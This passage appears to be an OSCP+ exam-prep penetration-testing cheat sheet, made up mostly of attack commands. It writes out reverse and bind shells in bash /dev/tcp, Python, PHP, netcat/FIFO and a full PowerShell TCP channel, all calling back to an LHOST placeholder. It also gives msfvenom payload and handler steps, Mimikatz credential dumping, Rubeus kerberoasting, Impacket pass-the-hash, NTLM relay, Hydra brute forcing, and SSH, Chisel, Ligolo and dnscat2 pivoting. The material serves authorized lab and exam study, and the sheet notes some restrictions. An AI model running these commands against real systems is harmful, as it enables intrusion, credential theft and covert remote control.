text: id="linux-reverse-shells">10.11.4 Linux reverse shells bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' Ncat transferred to target: ncat LHOST LPORT --exec /bin/sh If the injection launches /bin/sh , wrap Bash-only syntax in bash -c '...' and encode it for each outer parser. <h2

title: 10.11.5 Windows command channels
text: id="windows-command-channels">10.11.5 Windows command channels Prefer authenticated access when available: evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore ssh -p PORT USER@TARGET Transferred Ncat: ncat.exe LHOST LPORT --exec cmd.exe PowerShell TCP channel: $client = [Net.Sockets.TcpClient]::new('LHOST',LPORT) $stream = $client.GetStream() $buffer = New-Object byte[] 65535 while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) { $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count) $output = (Invoke-Expression $command 2>&1 | Out-String) + "PS $((Get-Location).Path)> " $bytes = [Text.Encoding]::ASCII.GetBytes($output) $stream.Write($bytes,0,$bytes.Length) $stream.Flush() } $client.Close() PowerShell nested-quoting transport: $command = 'COMMAND' [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)) powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE -EncodedCommand requires UTF-16LE. Base64 is representation, not encryption or AV evasion. <h2

title: 10.11.6 Bind shells
text: id="bind-shells">10.11.6 Bind shells <h3

title: 10.11.6.1 target, only if this nc build supports -e
text: id="variant-10-11-6-1">10.11.6.1 target, only if this nc build supports -e # target, only if this nc build supports -e nc -lvnp PORT -e /bin/sh <h3

title: 10.11.6.2 Kali
text: id="variant-10-11-6-2">10.11.6.2 Kali # Kali nc -nv TARGET PORT Ncat target: ncat -4 -lvn 0.0.0.0 PORT --exec /bin/sh FIFO fallback: rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp PORT >/tmp/f <h2

title: 10.11.7 Msfvenom selection
text: id="msfvenom-selection">10.11.7 Msfvenom selection msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options Stageless command shells: msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe file shell.elf shell.exe sha256sum shell.elf shell.exe Naming cue: shell_reverse_tcp = stageless/all-in-one shell/reverse_tcp = staged; needs a matching staging handler Handler: msfconsole -q use exploit/multi/handler set payload PAYLOAD_NAME set LHOST LHOST set LPORT LPORT show options run Generated payload, handler payload, transport, LHOST and LPORT must match exactly. Encoders do not guarantee AV evasion. <h2

title: 10.11.8 Callback ladder
text: id="callback-ladder">10.11.8 Callback ladder Prove delivery. Prove id / whoami or another harmless command in the vulnerable context. Repair parser, quoting, encoding, interpreter and length. Match OS, architecture, format and staged/stageless type. Start and verify the listener before triggering. Test target-to- LHOST:LPORT reachability. Gather concrete security-control evidence. Repair TTY/I/O only after a connection exists. Target checks: nc -vz LHOST LPORT curl -v --connect-timeout 5 http://LHOST:LPORT/ Test-NetConnection LHOST -Port LPORT -InformationLevel Detailed Kali observation: sudo tcpdump -ni any tcp port LPORT Packet/session evidence Meaning No SYN Execution/LHOST/route/egress/parser problem SYN but no response Listener bind/port/local firewall problem Handshake then close Crash, handler mismatch or control interference Stable connection, no commands Staged/raw mismatch, buffering or I/O issue <h2

title: 10.11.9 Security-control triage
text: id="security-control-triage">10.11.9 Security-control triage Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled Separate: transfer failure, quarantine, process denial, script-content block, crash, callback filtering, application control, language mode, permissions and missing dependencies. Do not call every silent failure “AV.” <h2

title: 10.11.10 TTY upgrade
text: id="tty-upgrade">10.11.10 TTY upgrade python3 -c 'import pty; pty.spawn("/bin/bash")' # Ctrl-Z locally stty raw -echo; fg # remote reset export TERM=xterm-256color stty rows 40 columns 120 Recovery on Kali: stty sane Socat: # Kali socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr # target socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT <h2

title: 10.11.11 Verify session
text: id="verify-session">10.11.11 Verify session hostname; id; pwd; ip addr; ip route; ss -lntup hostname whoami /all cd ipconfig /all route print netstat -ano <h2

title: 10.11.12 Handoff
text: id="handoff">10.11.12 Handoff Need a file → file transfer . New credential → credential sheet . Local shell → Linux or Windows privilege escalation. Internal interface/route → pivoting . Public PoC still failing before command execution → public exploit sheet . Document/shortcut, execution-policy, application-control or handler/module failure → payload execution . <h2

title: 10.11.13 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.11.13 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.11.13.1 Establish sessions and move files
text: id="establish-sessions-and-move-files">10.11.13.1 Establish sessions and move files <summary

title: 10.11.13.1.1 Find: Verify command execution, host and represented identity
text: id="variant-10-11-13-1-1">10.11.13.1.1 Find: Verify command execution, host and represented identity Begin with the original command/PoC/client result and request a small host/identity proof through its existing output channel. hostname id pwd Recognize: Host-specific identity output demonstrates execution under that account, not yet a reverse connection or full terminal. Validate next: Record OS, privilege and network position; choose an access form whose interpreter/service and route exist. Verify command execution, host and represented identity . <summary

title: 10.11.13.1.2 Find: Connect a Linux reverse shell through an available interpreter
text: id="variant-10-11-13-1-2">10.11.13.1.2 Find: Connect a Linux reverse shell through an available interpreter From the proven Linux command channel inspect available interpreters and the target's route to the proposed listener. command -v bash python3 php nc ip route get LHOST Recognize: An interpreter plus a plausible outbound route suggests a reverse-channel candidate. Validate next: Verify target-to-listener reachability, listener binding, exact shell/parser and payload compatibility. Connect a Linux reverse shell through an available interpreter . <summary

title: 10.11.13.1.3 Find: Use Windows authenticated access or a PowerShell command channel
text: id="variant-10-11-13-1-3">10.11.13.1.3 Find: Use Windows authenticated access or a PowerShell command channel From Windows execution inspect the actual PowerShell/runtime context and any reachable authenticated remote service before building a callback. whoami /all $PSVersionTable $ExecutionContext.SessionState.LanguageMode Recognize: The execution identity and constrained language context affect which command-channel implementations can run. Validate next: Check permitted language features, remote endpoint authorization or a working callback route; encoding does not grant those. Use Windows authenticated access or a PowerShell command channel . <summary

title: 10.11.13.1.4 Find: Use a bind shell when the target can accept inbound connections
text: id="variant-10-11-13-1-4">10.11.13.1.4 Find: Use a bind shell when the target can accept inbound connections Inspect target-side listening permissions, tool implementation and the assessment-source route to a proposed listener. nc -h ss -lnt Recognize: The implementation cannot use an assumed -e shell; another supported listener mechanism is needed. Validate next: Confirm a compatible bind command, permitted listener and inbound source-to-target reachability. Use a bind shell when the target can accept inbound connections . <summary

title: 10.11.13.1.5 Find: Generate a payload matching OS, process, format and handler
text: id="variant-10-11-13-1-5">10.11.13.1.5 Find: Generate a payload matching OS, process, format and handler Inspect the actual consumer/process and existing exploit constraints before browsing payload names or formats. file TARGET_ARTIFACT msfvenom -l payloads msfvenom --list formats Recognize: The staged payload name and executable consumer must be matched to the handler and delivery format. Validate next: Check target/process architecture, permitted feature, exact payload options, stage route and listener. Generate a payload matching OS, process, format and handler . <summary

title: 10.11.13.1.6 Find: Repair a limited Linux terminal
text: id="variant-10-11-13-1-6">10.11.13.1.6 Find: Repair a limited Linux terminal Inspect the working shell's terminal state and available PTY utilities after verifying a stable command channel. tty command -v python3 script socat Recognize: A functioning socket shell lacks a controlling terminal while a potential PTY mechanism exists. Validate next: Verify the available PTY mode, local terminal handling and stable connection; privilege remains unchanged. Repair a limited Linux terminal . <summary

title: 10.11.13.1.7 Find: Transfer over HTTP using Linux or Windows clients
text: id="variant-10-11-13-1-7">10.11.13.1.7 Find: Transfer over HTTP using Linux or Windows clients From the target's command context inspect downloader availability, writable destination and a route to the fixed served directory. command -v curl wget ls -ld /tmp ip route get LHOST Recognize: A downloader, destination and plausible outbound path enable an HTTP transfer candidate. Validate next: Check actual server bind/directory, HTTP request/response and source/destination hashes. Transfer over HTTP using Linux or Windows clients . <summary

title: 10.11.13.1.8 Find: Copy files through an authenticated SSH service
text: id="variant-10-11-13-1-8">10.11.13.1.8 Find: Copy files through an authenticated SSH service Use established SSH context to identify allowed file/subsystem access and the intended remote destination's rights. ssh -v -p PORT USER@TARGET Recognize: SSH authentication gives a candidate transport; it does not prove SFTP/subsystem support or destination write. Validate next: Validate client/server subsystem compatibility, source read and destination write; inspect resulting bytes. Copy files through an authenticated SSH service . <summary

title: 10.11.13.1.9 Find: Move Windows files through an authenticated SMB share
text: id="variant-10-11-13-1-9">10.11.13.1.9 Find: Move Windows files through an authenticated SMB share From Windows inspect TCP/445 reachability to the deliberate transfer server and distinguish its share identity from target-domain credentials. Test-NetConnection LHOST -Port 445 net use Recognize: The service is reachable, but an existing connection can constrain a different credential context. Validate next: Verify intended share/server credentials, conflicting mappings, read/write rights and destination hash. Move Windows files through an authenticated SMB share . <summary

title: 10.11.13.1.10 Find: Stream a file over a direct TCP connection
text: id="variant-10-11-13-1-10">10.11.13.1.10 Find: Stream a file over a direct TCP connection When richer transfers are unavailable, inspect the exact TCP tool and draw sender, receiver and writable output destination. nc -h ls -ld /DESTINATION_DIRECTORY Recognize: A raw stream may move bytes only if roles and connection direction are correct; no integrity metadata is supplied. Validate next: Confirm listener syntax, reachability, binary-clean I/O and a complete independent hash match. Stream a file over a direct TCP connection . <summary

title: 10.11.13.1.11 Find: Move a small artifact through a text-only channel
text: id="variant-10-11-13-1-11">10.11.13.1.11 Find: Move a small artifact through a text-only channel Inspect the existing channel's command-length/quoting limits and whether both sides can reconstruct a small encoded file. command -v base64 wc -c FILE Recognize: A small artifact and compatible decoder make text transport plausible, without assuming large encoded commands survive. Validate next: Verify exact length/quoting and source/destination hash; use the Windows decoding variant when appropriate. Move a small artifact through a text-only channel . <summary

title: 10.11.13.1.12 Find: Use a temporary FTP transfer as a constrained fallback
text: id="variant-10-11-13-1-12">10.11.13.1.12 Find: Use a temporary FTP transfer as a constrained fallback Inspect whether a compatible FTP client is the remaining route and whether the temporary server's data channel is reachable. ftp help quit Recognize: Client availability permits investigating FTP; binary mode and separate data-channel paths remain necessary. Validate next: Verify deliberate server scope, control/data connectivity, required read/write and post-transfer hashes. Use a temporary FTP transfer as a constrained fallback .

title: 10.12 Tool Command Reference
text: id="tool-command-reference">10.12 Tool Command Reference ← Cheatsheet index | Selection matrix | getSH coverage | Strategy map This sheet accounts for the tools listed by the reviewed getSH Tool Cheatsheet. The linked task procedures remain canonical because they include prerequisites, interpretation and failure routing. <h2

title: 10.12.1 Recon and scanning
text: id="recon-and-scanning">10.12.1 Recon and scanning <h3

title: 10.12.1.1 Nmap
text: id="nmap">10.12.1.1 Nmap nmap -Pn -sS -p- TARGET -oA full-tcp nmap -Pn -sV -sC -p PORTS TARGET -oA services sudo nmap -Pn -sU --top-ports 100 TARGET -oA udp-100 Direct/raw scanning baseline; connect scan -sT when raw packets are unavailable or through a TCP SOCKS route. Procedure <h3

title: 10.12.1.2 RustScan and Masscan
text: id="rustscan-and-masscan">10.12.1.2 RustScan and Masscan rustscan -a TARGET -r 1-65535 --ulimit 5000 -- -Pn -sV -sC -oA rustscan-followup sudo masscan TARGET -p1-65535 --rate 500 -oL masscan.txt Validate fast-discovery hits with Nmap; neither command covers UDP. Procedure <h3

title: 10.12.1.3 ffuf, Gobuster and Feroxbuster
text: id="ffuf-gobuster-and-feroxbuster">10.12.1.3 ffuf, Gobuster and Feroxbuster ffuf -w WORDLIST -u http://TARGET:PORT/FUZZ -ac -o ffuf.json gobuster dir -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -o gobuster.txt feroxbuster -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -o ferox.txt Calibrate against random paths; results are candidates. Web mapping <h3

title: 10.12.1.4 Nikto
text: id="nikto">10.12.1.4 Nikto nikto -h http://TARGET:PORT -output nikto.txt Manually reproduce useful candidates. Procedure <h2

title: 10.12.2 Service tools
text: id="service-tools">10.12.2 Service tools <h3

title: 10.12.2.1 SMB and RPC
text: id="smb-and-rpc">10.12.2.1 SMB and RPC smbclient -L //TARGET -N smbclient //TARGET/SHARE -U 'DOMAIN/USER' rpcclient -U '' -N TARGET nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares Null, guest and authenticated views differ. SMB procedure <h3

title: 10.12.2.2 ldapsearch
text: id="ldapsearch">10.12.2.2 ldapsearch ldapsearch -x -LLL -H ldap://DC_IP:389 -s base -b '' defaultNamingContext dnsHostName ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W -b 'DC=DOMAIN,DC=TLD' '(objectClass=user)' sAMAccountName memberOf LDAP/Kerberos procedure <h3

title: 10.12.2.3 FreeRDP
text: id="freerdp">10.12.2.3 FreeRDP <h4

title: 10.12.2.3.1 xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard
text: id="variant-10-12-2-3-1">10.12.2.3.1 xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution <h4

title: 10.12.2.3.2 Older package name
text: id="variant-10-12-2-3-2">10.12.2.3.2 Older package name # Older package name xfreerdp /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard Prefer password prompting instead of retained shell history. /pth invokes Restricted Admin behavior: the target must permit it and the identity must be an administrator. Ordinary RDP instead needs an effective remote-interactive logon right. RDP procedure and lateral movement <h2

title: 10.12.3 Credential tools
text: id="credential-tools">10.12.3 Credential tools <h3

title: 10.12.3.1 Hydra
text: id="hydra">10.12.3.1 Hydra Use only after explicit authorization , a confirmed endpoint, known usernames and lockout/rate-limit review. hydra -l USER -P PASSWORDS -s PORT ssh://TARGET -t 4 -f hydra -L USERS -p ONE_PASSWORD -s PORT ftp://TARGET -t 4 -f HTTP form syntax depends on the exact request and failure marker: hydra -l USER -P PASSWORDS TARGET http-post-form \ '/login:username=^USER^&password=^PASS^:F=Invalid credentials' Capture the form with Burp/curl first. Stop on lockout/rate-limit evidence. Password spraying is not the same as brute forcing. <h3

title: 10.12.3.2 Hashcat and John
text: id="hashcat-and-john">10.12.3.2 Hashcat and John hashcat -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m MODE hashes.txt --show john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt john --show hash.txt Credential cheatsheet <h2

title: 10.12.4 Local privilege-escalation tools
text: id="local-privilege-escalation-tools">10.12.4 Local privilege-escalation tools <h3

title: 10.12.4.1 LinPEAS, LSE and unix-privesc-check
text: id="linpeas-lse-and-unix-privesc-check">10.12.4.1 LinPEAS, LSE and unix-privesc-check ./linpeas.sh | tee linpeas.txt ./lse.sh | tee lse.txt ./lse.sh -l1 | tee lse-l1.txt ./unix-privesc-check standard > unix-privesc-check.txt Generate candidates, then prove the exact object, effective permission , privileged consumer, identity and trigger. LinPEAS -a is intentionally not the baseline: upstream documents longer/noisier checks including process monitoring and password attempts. LSE -l2 and unix-privesc-check detailed are later depth. Linux procedure <h3

title: 10.12.4.2 pspy
text: id="pspy">10.12.4.2 pspy ./pspy64 ./pspy64 -pf -i 1000 Default output watches processes; -f adds filesystem events and -i 1000 scans procfs every second. An observed UID/command proves execution, not control over its inputs. Linux procedure <h3

title: 10.12.4.3 Responder and NTLM relay
text: id="responder-and-ntlm-relay">10.12.4.3 Responder and NTLM relay sudo responder -I INTERFACE impacket-ntlmrelayx -tf targets.txt -smb2support Authorized labs only: poisoning/spoofing is prohibited by the current OSCP+ exam guide. Relay additionally requires a victim authentication event, reachable compatible target and protections/configuration that permit relay. Do not use as a default credential step. <h2

title: 10.12.5 Active Directory tools
text: id="active-directory-tools">10.12.5 Active Directory tools <h3

title: 10.12.5.1 PowerView
text: id="powerview">10.12.5.1 PowerView Import-Module .\PowerView.ps1 Get-DomainUser Get-DomainGroup Get-DomainComputer Get-DomainUser -SPN Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs <h3

title: 10.12.5.2 Mimikatz
text: id="mimikatz">10.12.5.2 Mimikatz mimikatz.exe privilege::debug sekurlsa::logonpasswords sekurlsa::tickets lsadump::sam Requires suitable local privilege/protection state. Treat output as sensitive. Credential-access procedure <h3

title: 10.12.5.3 Rubeus
text: id="rubeus">10.12.5.3 Rubeus Rubeus.exe triage Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt Rubeus.exe ptt /ticket:ticket.kirbi Kerberos procedure <h3

title: 10.12.5.4 NetExec / CrackMapExec
text: id="netexec--crackmapexec">10.12.5.4 NetExec / CrackMapExec nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' nxc smb TARGET -d DOMAIN -u USER -H NT_HASH nxc smb TARGET -u Administrator -H NT_HASH --local-auth nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname & whoami" --exec-method wmiexec nxc winrm TARGET -d DOMAIN -u USER -p 'PASSWORD' Prefer the maintained nxc ; older installations may expose crackmapexec . (Pwn3d!) is an SMB admin-context cue, not universal execution proof. Current SMB execution methods include wmiexec , atexec and smbexec ; force one while diagnosing instead of hiding method-specific failure behind fallback. <h3

title: 10.12.5.5 Impacket suite
text: id="impacket-suite">10.12.5.5 Impacket suite impacket-GetNPUsers DOMAIN/ -no-pass -request -usersfile users.txt -dc-ip DC_IP -outputfile asrep.txt impacket-GetUserSPNs -request -dc-ip DC_IP -outputfile tgs.txt 'DOMAIN/USER:PASSWORD' impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' impacket-smbexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' impacket-mssqlclient 'DOMAIN/USER:PASSWORD@TARGET' -windows-auth Kerberos cache with separate naming and routing: export KRB5CCNAME="$PWD/USER.ccache" impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' Script names may include or omit the impacket- prefix by package. Inspect -h locally. Use the SPN -matching hostname in the target string and -target-ip for routing. Current Impacket DCOMExec rejects Kerberos; use WMIExec for that context. AD procedures <h3

title: 10.12.5.6 Evil-WinRM, WinRS and PowerShell remoting
text: id="evil-winrm-winrs-and-powershell-remoting">10.12.5.6 Evil-WinRM, WinRS and PowerShell remoting evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' evil-winrm -i TARGET_HOST -u USER -H NT_HASH evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986 evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" Test-WSMan TARGET_HOST $Credential = Get-Credential 'DOMAIN\USER' Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock { hostname; whoami /all } Needs an enabled 5985/5986 listener and endpoint authorization. Kerberos uses the target FQDN/SPN. IP-based PowerShell remoting requires explicit credentials and normally HTTPS or a tightly scoped TrustedHosts entry; do not weaken global trust to disguise a DNS/SPN error. Lateral movement <h3

title: 10.12.5.7 BloodHound and SharpHound
text: id="bloodhound-and-sharphound">10.12.5.7 BloodHound and SharpHound .\SharpHound.exe -c All --zipfilename sharphound.zip bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -ns DC_IP -dc DC_HOST -c All --zip Collection/ingestion versions must match. Validate chosen edges manually. <h3

title: 10.12.5.8 Certipy
text: id="certipy">10.12.5.8 Certipy certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -enabled -vulnerable -stdout certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -target DC_HOST -ca CA_NAME -template TEMPLATE certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP Some packages expose certipy instead of certipy-ad . AD CS procedure <h2

title: 10.12.6 Web exploitation tools
text: id="web-exploitation-tools">10.12.6 Web exploitation tools <h3

title: 10.12.6.1 SQLmap
text: id="sqlmap">10.12.6.1 SQLmap # Lab/reference only; prohibited on the OSCP+ exam sqlmap -r request.txt --batch --dbs Preserve only as a lab/research comparator. Use manual SQL injection for exam preparation. <h3

title: 10.12.6.2 WPScan
text: id="wpscan">10.12.6.2 WPScan wpscan --url https://HOSTNAME/ --disable-tls-checks --enumerate vp,vt,u --plugins-detection mixed -o wpscan.txt Verify active component/version and configuration manually. WordPress procedure <h2

title: 10.12.7 Payload and pivot tools
text: id="payload-and-pivot-tools">10.12.7 Payload and pivot tools <h3

title: 10.12.7.1 SearchSploit and exploit toolchains
text: id="searchsploit-and-exploit-toolchains">10.12.7.1 SearchSploit and exploit toolchains searchsploit --cve CVE searchsploit -t "PRODUCT VERSION" searchsploit PRODUCT VERSION --exclude="/dos/" searchsploit -x EDB_ID searchsploit -m EDB_ID python3 -m py_compile exploit.py gcc -Wall -Wextra exploit.c -o exploit i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32 x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32 file exploit exploit-x86.exe exploit-x64.exe Audit source first; match exact prerequisites; compile for where the exploit program runs and generate payloads for the target execution context. Public exploit procedure <h3

title: 10.12.7.2 msfvenom, multi/handler and Netcat
text: id="msfvenom-multihandler-and-netcat">10.12.7.2 msfvenom, multi/handler and Netcat msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe rlwrap nc -lvnp LPORT ncat -4 -lvn 0.0.0.0 LPORT msfconsole -q use exploit/multi/handler set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT set ExitOnSession false show options run -j jobs -l sessions -l sessions -i SESSION_ID nc and Nmap Ncat have different option conventions. A staged name such as shell/reverse_tcp needs an exact staging handler; shell_reverse_tcp is the common stageless form. msfvenom and multi/handler have across-target exam exceptions, but Meterpreter remains one-target restricted. Shell procedure and payload diagnosis <h3

title: 10.12.7.3 Windows payload-control evidence
text: id="windows-payload-control-evidence">10.12.7.3 Windows payload-control evidence Get-ExecutionPolicy -List $ExecutionContext.SessionState.LanguageMode Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled Get-MpThreatDetection | Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources Get-AppLockerPolicy -Effective -Xml Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 50 Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' -MaxEvents 50 Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' -MaxEvents 50 Separate execution policy, language mode, AMSI, application control, antimalware, permissions and architecture. Missing cmdlets/logs are inconclusive . Payload diagnosis <h3

title: 10.12.7.4 Metasploit restricted module workflow
text: id="metasploit-restricted-module-workflow">10.12.7.4 Metasploit restricted module workflow search type:exploit cve:CVE_ID info MODULE_PATH use MODULE_PATH show options show advanced show targets show payloads set RHOSTS TARGET set RPORT PORT set TARGET TARGET_ID set PAYLOAD PAYLOAD_NAME show missing run Auxiliary, Exploit or Post modules—or Meterpreter—lock use to one selected exam target even if check or the attempt fails. Metasploit pivoting and automatic exploitation are prohibited. Module rank is not vulnerability proof. <h3

title: 10.12.7.5 SSH forwarding and ProxyChains
text: id="ssh-forwarding-and-proxychains">10.12.7.5 SSH forwarding and ProxyChains ssh -N -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT -p SSH_PORT USER@PIVOT -o ExitOnForwardFailure=yes ssh -N -D 127.0.0.1:1080 -p SSH_PORT USER@PIVOT -o ExitOnForwardFailure=yes ssh -N -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT -p KALI_SSH_PORT KALI_USER@LHOST -o ExitOnForwardFailure=yes ssh -N -R 127.0.0.1:1080 -p KALI_SSH_PORT KALI_USER@LHOST -o ExitOnForwardFailure=yes ssh -J PIVOT_USER@PIVOT TARGET_USER@INTERNAL_HOST proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_HOST:PORT/ -L / -D listen on the SSH client; -R listens on the SSH server. ProxyChains is TCP-only and cannot carry SYN/ICMP/UDP/pcap operations. Pivoting procedure <h3

title: 10.12.7.6 Socat, sshuttle and Windows relays
text: id="socat-sshuttle-and-windows-relays">10.12.7.6 Socat, sshuttle and Windows relays socat -ddd TCP-LISTEN:LOCAL_PORT,bind=PIVOT_REACHABLE_IP,reuseaddr,fork TCP:INTERNAL_HOST:INTERNAL_PORT sudo sshuttle --dns -r SSH_USER@PIVOT:SSH_PORT INTERNAL_SUBNET plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" -l KALI_USER -pwfile C:\PATH\kali-password.txt -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT -P KALI_SSH_PORT LHOST netsh interface portproxy add v4tov4 listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT connectaddress=INTERNAL_HOST connectport=INTERNAL_PORT netsh interface portproxy show all Socat is a clear fixed relay. sshuttle creates a selected-subnet TCP/DNS-oriented route. Netsh is elevated, persistent and TCP-only; record firewall changes and cleanup. <h3

title: 10.12.7.7 Chisel and Ligolo-ng
text: id="chisel-and-ligolo-ng">10.12.7.7 Chisel and Ligolo-ng chisel server --reverse --port CHISEL_PORT chisel client --fingerprint 'SERVER_FINGERPRINT' LHOST:CHISEL_PORT R:127.0.0.1:1080:socks ./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT ./agent -connect LHOST:LIGOLO_PORT -accept-fingerprint CERT_FINGERPRINT Ligolo console: interface_create --name ligolo session interface_add_route --name ligolo --route INTERNAL_SUBNET tunnel_start --tun ligolo listener_add --addr 0.0.0.0:PIVOT_PORT --to 127.0.0.1:KALI_PORT --tcp Current Chisel socks is TCP CONNECT; udpsocks adds SOCKS5 UDP ASSOCIATE for compatible current peers/clients. This does not add UDP support to ProxyChains. Ligolo supplies routed access; agent listeners handle reverse callbacks. Pivoting procedure <h3

title: 10.12.7.8 dnscat2
text: id="dnscat2">10.12.7.8 dnscat2 dnscat2-server --secret=SHARED_SECRET TUNNEL_DOMAIN ./dnscat --secret=SHARED_SECRET TUNNEL_DOMAIN ./dnscat --dns server=DNS_SERVER,port=53 --secret=SHARED_SECRET Conditional DNS-only route requiring client execution and authoritative delegation or direct DNS-server reachability. Validate the resolver path before the encrypted session. <h3

title: 10.12.7.9 Evidence capture and final report package
text: id="evidence-capture-and-final-report-package">10.12.7.9 Evidence capture and final report package mkdir -p evidence/{nmap,web,loot,sessions,screenshots} script -q -f evidence/session.txt # Run the intended commands, then exit to close/flush the transcript. sha256sum FILE | tee FILE.sha256 7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf 7z l OSCP-OS-XXXXX-Exam-Report.7z 7z t OSCP-OS-XXXXX-Exam-Report.7z md5sum OSCP-OS-XXXXX-Exam-Report.7z Start-Transcript -Path .\evidence\powershell-session.txt Get-FileHash -Algorithm SHA256 -LiteralPath '.\FILE' Get-FileHash -Algorithm MD5 -LiteralPath '.\OSCP-OS-XXXXX-Exam-Report.7z' Stop-Transcript A transcript supports reproduction but is not the final narrative. Recheck the current guide, inspect every PDF page, confirm the archive contains only the correctly named PDF, compare the local/upload MD5 and complete final submission. Integrated evidence procedure <h2
